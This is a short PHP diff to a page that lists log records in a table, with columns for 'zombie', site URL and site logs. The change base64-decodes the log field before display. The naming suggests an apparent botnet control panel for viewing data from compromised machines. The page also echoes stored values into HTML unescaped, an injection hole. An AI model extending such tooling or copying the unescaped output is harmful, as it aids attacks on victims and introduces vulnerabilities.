@@ -27,12 +27,18 @@ require_once('includes/config.php');
     $logs->execute();
     while($fetch = $logs->fetch())
     {
+        if(base64_decode($fetch['logs_site'], true) != ''){
+            $log = base64_decode($fetch['logs_site'], true);
+        }
+        else{
+            $log = $fetch['logs_site'];
+        }
         ?>
     <tr>
       <td><?php echo $fetch['id']; ?></td>
       <td><?php echo $fetch['zombie']; ?></td>
       <td><?php echo $fetch['url_site']; ?></td>
-      <td><?php echo $fetch['logs_site']; ?></td>
+      <td><?php echo $log; ?></td>
     </tr>
       <?php
     }
